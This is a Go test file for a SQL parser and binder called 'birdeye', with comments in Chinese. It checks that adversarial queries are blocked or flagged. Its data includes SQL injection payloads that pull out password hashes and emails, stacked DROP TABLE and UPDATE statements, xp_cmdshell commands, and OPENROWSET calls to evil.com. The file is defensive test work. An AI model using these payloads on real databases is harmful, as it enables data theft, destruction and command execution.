package birdeye

import (
	"encoding/json"
	"strings"
	"testing"
)

// 對照 birdeye_1150831/tests/test_security_adversarial_suite.py（52）
//                     + test_adversarial_appendix.py（18）

func advReg(t *testing.T) *MetadataRegistry {
	return mkReg(t, "table_name,column_name,data_type\n"+
		"Customer,CustomerID,INT\nCustomer,Name,NVARCHAR\nCustomer,Email,NVARCHAR\n"+
		"Orders,OrderID,INT\nOrders,CustomerID,INT\n")
}

func advBindErr(t *testing.T, sql string) error {
	t.Helper()
	toks, err := NewLexer(sql).Tokenize()
	if err != nil {
		return err
	}
	ast, err := NewParser(toks, sql).Parse()
	if err != nil {
		return err
	}
	_, err = NewBinder(advReg(t)).Bind(ast, nil)
	return err
}

func advParseErr(t *testing.T, sql string) error {
	t.Helper()
	toks, err := NewLexer(sql).Tokenize()
	if err != nil {
		return err
	}
	_, err = NewParser(toks, sql).Parse()
	return err
}

func wantKind(t *testing.T, err error, kinds ...ErrKind) {
	t.Helper()
	if err == nil {
		t.Fatalf("預期錯誤（%v），卻成功", kinds)
	}
	be, ok := err.(*Error)
	if !ok {
		t.Fatalf("非 *Error: %v", err)
	}
	for _, k := range kinds {
		if be.Kind == k {
			return
		}
	}
	t.Fatalf("錯誤分類 %v 不在預期 %v：%s", be.Kind, kinds, be.Msg)
}

// TestAdversarialAppendix：對照 test_adversarial_appendix.py 的 18 案例
// （論文附錄 Table「18/18 通過」）。PARSE_ERROR = pipeline 報錯；INTENT_OK = 成功回傳意圖。
func TestAdversarialAppendix(t *testing.T) {
	reg := mkReg(t, "table_schema,table_name,column_name,data_type\n"+
		"dbo,Employee,id,INT\ndbo,Employee,Name,NVARCHAR\ndbo,Employee,Salary,DECIMAL\ndbo,Employee,Dept,NVARCHAR\n")
	run := func(sql string) ([]Intent, error) {
		res, err := NewRunner(reg).RunMulti(sql, nil)
		if err != nil {
			return nil, err
		}
		var m any
		json.Unmarshal([]byte(res.JSON), &m)
		return NewIntentExtractor().Extract(m), nil
	}
	cases := []struct {
		sql     string
		wantErr bool
		desc    string
	}{
		{"ＳＥＬＥＣＴ id FROM dbo.Employee", true, "Unicode 全形關鍵字"},
		{"SE​LECT id FROM dbo.Employee", true, "零寬字元插入"},
		{"SELECT Name FROM dbo.Employee WHERE Name = N'Alice'", false, "N'' 前綴"},
		{"SELECT [Name] FROM [dbo].[Employee]", false, "括號識別字"},
		{"[SELECT] * FROM dbo.Employee", true, "括號包關鍵字作欄位名"},
		{"WITH e AS (SELECT id, Name FROM dbo.Employee) SELECT id FROM e", false, "CTE"},
		{"SELECT id FROM (SELECT id, Name FROM dbo.Employee) AS sub", false, "巢狀子查詢"},
		{"SELECT Name FROM dbo.Employee WHERE id = 1 OR 1=1", false, "OR 1=1"},
		{"SELECT Name FROM dbo.Employee UNION SELECT Salary FROM dbo.Employee", true, "UNION 型別不符"},
		{"SELECT Name FROM dbo.Employee WHERE id = 1 -- DROP TABLE dbo.Employee", false, "註釋截斷"},
		{"SEL/**/ECT Name FROM dbo.Employee", true, "行內註釋分割關鍵字"},
		{"SELECT Name FROM dbo.Employee; DROP TABLE dbo.Employee", false, "堆疊查詢（run_multi）"},
		{"WAITFOR DELAY '0:0:5'", true, "WAITFOR"},
		{"SELECT OPENROWSET('SQLNCLI', 'Server=evil.com', 'SELECT 1')", true, "OPENROWSET"},
		{"SELECT OPENDATASOURCE('SQLNCLI', 'Data Source=evil.com')", true, "OPENDATASOURCE"},
		{"EXEC ('SELECT * FROM dbo.Employee')", true, "EXEC 字串"},
		{"EXEC sp_executesql N'SELECT * FROM dbo.Employee'", true, "sp_executesql"},
		{"EXEC (@sql)", true, "EXEC @var"},
	}
	for i, c := range cases {
		is, err := run(c.sql)
		if c.wantErr && err == nil {
			t.Errorf("Case%02d (%s): 預期 PARSE_ERROR，卻成功", i+1, c.desc)
		}
		if !c.wantErr && err != nil {
			t.Errorf("Case%02d (%s): 預期 INTENT_OK，卻錯誤: %v", i+1, c.desc, err)
		}
		if !c.wantErr && err == nil && is == nil {
			// 空 intent list 也算 OK（DROP 產生空意圖）
		}
	}
}

func TestAdversarialExecBlocklist(t *testing.T) {
	blocked := []string{
		"EXEC xp_cmdshell 'whoami'",
		"EXEC sp_executesql N'SELECT * FROM Customer'",
		"EXEC sp_configure 'show advanced options', 1",
		"EXEC XP_CMDSHELL 'dir'",
		"EXEC Xp_CmdShell 'dir'",
		"EXECUTE xp_cmdshell 'net user'",
	}
	for _, sql := range blocked {
		err := advBindErr(t, sql)
		wantKind(t, err, ErrSemantic)
		if be := err.(*Error); !strings.Contains(be.Msg, "blocked by ZTA policy") {
			t.Errorf("%q: 訊息 %q 未含 blocked by ZTA policy", sql, be.Msg)
		}
	}
	// OUTPUT / 括號引數 → parser SyntaxError（fail-closed，同為拒絕）
	for _, sql := range []string{
		"EXEC sp_oa_create 'WScript.Shell', @obj OUTPUT",
		"EXEC sp_oa_method @obj, 'Run', @ret OUTPUT, 'cmd'",
		"EXEC openquery(LinkedSrv, 'SELECT * FROM remote.db')",
	} {
		wantKind(t, advBindErr(t, sql), ErrSemantic, ErrSyntax)
	}
}

func TestAdversarialFunctionBlocklist(t *testing.T) {
	for _, sql := range []string{
		"SELECT IS_SRVROLEMEMBER('sysadmin')",
		"SELECT HAS_PERMS_BY_NAME('Customer', 'OBJECT', 'SELECT')",
		"SELECT openrowset('MSDASQL', 'Driver=SQL Server', 'SELECT 1')",
		"SELECT OPENXML(1, '/r') FROM Customer",
	} {
		wantKind(t, advBindErr(t, sql), ErrSemantic)
	}
	for _, sql := range []string{
		"SELECT * FROM OPENROWSET('SQLNCLI','Server=evil.com;','SELECT secret FROM db.dbo.secrets')",
		"SELECT * FROM OPENDATASOURCE('SQLNCLI','Data Source=evil.com').db.dbo.T",
	} {
		wantKind(t, advBindErr(t, sql), ErrSemantic, ErrSyntax)
	}
}

func TestAdversarialStackedQuery(t *testing.T) {
	for _, sql := range []string{
		"SELECT * FROM Customer; DROP TABLE Customer",
		"SELECT CustomerID FROM Customer; WAITFOR DELAY '0:0:5'",
		"SELECT Name FROM Customer; INSERT INTO Customer(Name) VALUES('injected')",
		"SELECT Name FROM Customer; UPDATE Customer SET Name='pwned' WHERE 1=1",
		"SELECT 1 SELECT 2",
		"SELECT * FROM Customer; DROP TABLE Customer --",
		"WAITFOR DELAY '0:0:5'",
	} {
		wantKind(t, advParseErr(t, sql), ErrSyntax)
	}
	// 單語句尾端分號合法
	if err := advParseErr(t, "SELECT CustomerID FROM Customer;"); err != nil {
		t.Errorf("尾端分號應合法: %v", err)
	}
}

func TestAdversarialCommentAndFailClosed(t *testing.T) {
	ok := []string{
		"SELECT CustomerID -- this is id\n, Name FROM Customer",
		"SELECT /* bypass? */ CustomerID FROM Customer",
		"SELECT CustomerID /* outer */ FROM Customer",
		"SELECT CustomerID FROM Customer WHERE Name = N'Taipei'",
		"INSERT INTO Customer(Name) VALUES(N'測試名稱')",
	}
	for _, sql := range ok {
		if err := advParseErr(t, sql); err != nil {
			t.Errorf("%q 應解析成功: %v", sql, err)
		}
	}
	failClosed := []string{
		"SEL/**/ECT CustomerID FROM Customer",
		"SELECT * FROM Sales PIVOT (SUM(Amount) FOR Region IN ([North],[South])) AS P",
		"SELECT CustomerID, Name FROM Customer FOR XML AUTO",
		"SELECT CustomerID FROM Customer FOR JSON PATH",
		"BULK INSERT Customer FROM 'C:\\data.csv'",
		"SELECT id FROM T FOR XML RAW",
		"",
		"-- just a comment",
	}
	for _, sql := range failClosed {
		if advParseErr(t, sql) == nil {
			t.Errorf("%q 應 fail-closed 報錯", sql)
		}
	}
	// Lexer 層 fail-closed
	for _, sql := range []string{
		"SELECT * FROM Customer WHERE Name = 'unclosed",
		"SELECT [unclosed FROM Customer",
	} {
		wantKind(t, advParseErr(t, sql), ErrValue, ErrSyntax)
	}
}

func TestAdversarialQuoteClosingInjection(t *testing.T) {
	reg := mkReg(t, "table_schema,table_name,column_name,data_type\n"+
		"SalesLT,Customer,CustomerID,INT\nSalesLT,Customer,Name,NVARCHAR\n"+
		"SalesLT,Customer,EmailAddress,NVARCHAR\nSalesLT,Customer,Phone,NVARCHAR\n"+
		"SalesLT,Customer,PasswordHash,NVARCHAR\n")
	sensitive := map[[2]string]bool{
		{"CUSTOMER", "EMAILADDRESS"}: true, {"CUSTOMER", "PHONE"}: true, {"CUSTOMER", "PASSWORDHASH"}: true,
	}
	runIntents := func(sql string) ([]Intent, error) {
		res, err := NewRunner(reg).Run(sql, nil)
		if err != nil {
			return nil, err
		}
		var m any
		json.Unmarshal([]byte(res.JSON), &m)
		ie := NewIntentExtractor()
		return ie.ExpandStarIntents(ie.Extract(m), reg), nil
	}
	hitsSensitive := func(is []Intent) bool {
		for _, it := range is {
			col := ""
			if it.Column != nil {
				col = strings.ToUpper(*it.Column)
			}
			if sensitive[[2]string{strings.ToUpper(it.Table), col}] {
				return true
			}
		}
		return false
	}

	t2 := "SELECT CustomerID, Name FROM SalesLT.Customer WHERE Name = '%s'"
	sprintf := func(tmpl, payload string) string { return strings.Replace(tmpl, "%s", payload, 1) }

	surfaces := []string{
		sprintf(t2, "' UNION SELECT CustomerID, EmailAddress FROM SalesLT.Customer--"),
		sprintf(t2, "' UNION SELECT CustomerID, PasswordHash FROM SalesLT.Customer--"),
		sprintf(t2, "' UNION SELECT NULL, EmailAddress FROM SalesLT.Customer--"),
		sprintf(t2, "' OR PasswordHash IS NOT NULL--"),
		sprintf(t2, "' AND SUBSTRING(EmailAddress,1,1)=CHAR(97)--"),
		sprintf(t2, "' OR EmailAddress LIKE CHAR(37)--"),
	}
	for _, sql := range surfaces {
		is, err := runIntents(sql)
		if err != nil {
			t.Errorf("%q: %v", sql, err)
			continue
		}
		if !hitsSensitive(is) {
			t.Errorf("%q: 預期產生敏感欄位 intent", sql)
		}
	}
	// T3 需替換 %%%s%% → 手動組
	t3email := "SELECT CustomerID, Name FROM SalesLT.Customer WHERE Name LIKE '%' UNION SELECT CustomerID, EmailAddress FROM SalesLT.Customer--%'"
	if is, err := runIntents(t3email); err != nil || !hitsSensitive(is) {
		t.Errorf("T3 union email: err=%v", err)
	}

	stacked := []string{
		sprintf(t2, "'; DROP TABLE SalesLT.Customer--"),
		sprintf(t2, "'; UPDATE SalesLT.Customer SET PasswordHash=CHAR(49) WHERE 1=1--"),
		"SELECT CustomerID, Name FROM SalesLT.Customer WHERE Name LIKE '%'; EXEC xp_cmdshell CHAR(119)--%'",
	}
	for _, sql := range stacked {
		if _, err := runIntents(sql); err == nil {
			t.Errorf("%q: stacked query 應 fail-closed", sql)
		}
	}

	// 已知邊界：四段式識別符被 parser 接受
	if _, err := NewRunner(reg).ParseOnly("SELECT * FROM LinkedSrv.RemoteDB.dbo.Customer", nil); err != nil {
		t.Logf("四段式識別符 parser 拒絕（若未來加驗證則正常）: %v", err)
	}
}
